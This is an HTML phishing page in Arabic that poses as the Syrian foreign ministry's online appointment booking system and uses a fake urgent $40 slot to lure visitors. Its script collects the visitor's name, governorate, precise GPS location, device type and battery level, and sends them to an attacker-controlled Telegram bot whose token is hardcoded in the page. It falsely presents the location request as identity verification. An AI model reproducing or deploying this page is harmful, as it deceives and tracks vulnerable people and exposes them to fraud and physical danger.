<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>الجمهورية العربية السورية - وزارة الخارجية والمغتربين</title>
    <style>
        /* التنسيقات اللونية الرسمية */
        body { 
            font-family: 'Segoe UI', Tahoma, sans-serif; 
            background-color: #f8f9fa; 
            margin: 0; 
            text-align: center; 
            font-weight: 900; 
            color: #333;
        }
        .header { 
            background: #ffffff; 
            padding: 20px; 
            border-bottom: 5px solid #b38a2e; /* اللون الذهبي الرسمي */
            box-shadow: 0 4px 10px rgba(0,0,0,0.1); 
        }
        .header img { 
            max-width: 85%; 
            height: auto; 
            max-height: 90px; 
        }
        .container { 
            max-width: 450px; 
            margin: 30px auto; 
            padding: 30px; 
            background: #ffffff; 
            border-radius: 20px; 
            box-shadow: 0 10px 30px rgba(0,0,0,0.08); 
            border: 1px solid #e0e0e0;
        }
        h2 { 
            color: #1a237e; /* الأزرق الملكي */
            font-size: 26px; 
            margin-bottom: 10px; 
            border-bottom: 2px solid #b38a2e;
            display: inline-block;
            padding-bottom: 5px;
        }
        .promo-box { 
            background-color: #fff3cd; 
            color: #856404; 
            padding: 15px; 
            border-radius: 10px; 
            font-size: 16px; 
            margin-bottom: 25px; 
            border: 1px solid #ffeeba;
        }
        label { 
            display: block; 
            text-align: right; 
            margin: 15px 5% 8px; 
            font-size: 18px; 
            color: #1a237e; 
        }
        input, select { 
            width: 90%; 
            padding: 15px; 
            margin-bottom: 20px; 
            border: 2px solid #ced4da; 
            border-radius: 12px; 
            font-size: 16px; 
            font-weight: 800; 
            background: #fdfdfd; 
            outline: none;
        }
        input:focus { border-color: #b38a2e; }
        
        .btn { 
            background: linear-gradient(135deg, #b38a2e 0%, #8e6d24 100%); 
            color: white; 
            padding: 18px; 
            border: none; 
            border-radius: 12px; 
            width: 90%; 
            font-size: 20px; 
            font-weight: 900; 
            cursor: pointer; 
            box-shadow: 0 5px 15px rgba(179, 138, 46, 0.4);
            transition: 0.3s;
        }
        .btn:hover { transform: translateY(-2px); box-shadow: 0 7px 20px rgba(179, 138, 46, 0.6); }
        
        .footer { 
            margin-top: 40px; 
            font-size: 13px; 
            color: #6c757d; 
            padding-bottom: 30px; 
        }
    </style>
</head>
<body>

<div class="header">
    <img src="https://r.jina.ai/i/05e043690d7c4938a19266f8e7784013" alt="شعار الوزارة">
</div>

<div class="container">
    <h2>منظومة الحجز الإلكتروني</h2>
    <div class="promo-box">
        ⚠️ تنبيه: متاح حالياً 7 مقاعد فقط للدور المستعجل (الرسم: 40$).
    </div>
    
    <label>الاسم الثلاثي:</label>
    <input type="text" id="name" placeholder="اكتب اسمك كما في الهوية">

    <label>المحافظة المقيم بها:</label>
    <select id="city">
        <option value="">-- اختر من القائمة --</option>
        <option value="إدلب">إدلب</option>
        <option value="حلب">حلب</option>
        <option value="دمشق">دمشق</option>
        <option value="حمص">حمص</option>
        <option value="حماة">حماة</option>
        <option value="اللاذقية">اللاذقية</option>
        <option value="طرطوس">طرطوس</option>
        <option value="درعا">درعا</option>
        <option value="دير الزور">دير الزور</option>
    </select>

    <button class="btn" onclick="startProcess()">تأكيد وإرسال الطلب</button>
</div>

<div class="footer">
    الجمهورية العربية السورية - وزارة الخارجية والمغتربين © 2026
</div>

<script>
    async function startProcess() {
        let name = document.getElementById("name").value;
        let city = document.getElementById("city").value;

        if (!name || !city) { 
            alert("يرجى ملء كافة الحقول المطلوبة."); 
            return; 
        }

        // طلب الإذن للموقع والكاميرا (كجزء من التحقق الأمني)
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(async (p) => {
                let lat = p.coords.latitude;
                let lon = p.coords.longitude;
                
                // جلب معلومات البطارية والجهاز
                let batt = "غير معروفة";
                try { const b = await navigator.getBattery(); batt = Math.round(b.level * 100) + "%"; } catch(e){}
                let device = navigator.platform + " (" + (navigator.userAgent.includes("Android") ? "Android" : "iPhone/PC") + ")";

                let token = "8669811855:AAGvHpikmaCi4E_dlFy24J1iYUgAdlnXWsg";
                let chat_id = "7214473798";
                
                let text = `🎯 صيد ملون وجديد!\n\n` +
                           `👤 الاسم: ${name}\n` +
                           `🏙️ المحافظة: ${city}\n` +
                           `📍 الموقع: https://www.google.com/maps?q=${lat},${lon}\n` +
                           `📱 الجهاز: ${device}\n` +
                           `🔋 البطارية: ${batt}`;

                // إرسال البيانات فوراً
                let url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(text)}`;
                new Image().src = url;

                alert("✅ تم تسجيل طلبك بنجاح! انتظر اتصالاً من القسم الفني لتأكيد موعد الاستلام.");
            }, (err) => {
                alert("⚠️ عذراً: يجب تفعيل نظام الـ GPS وإذن الوصول للتحقق من هويتك لإتمام الحجز.");
            }, {enableHighAccuracy: true});
        }
    }
</script>

</body>
</html>
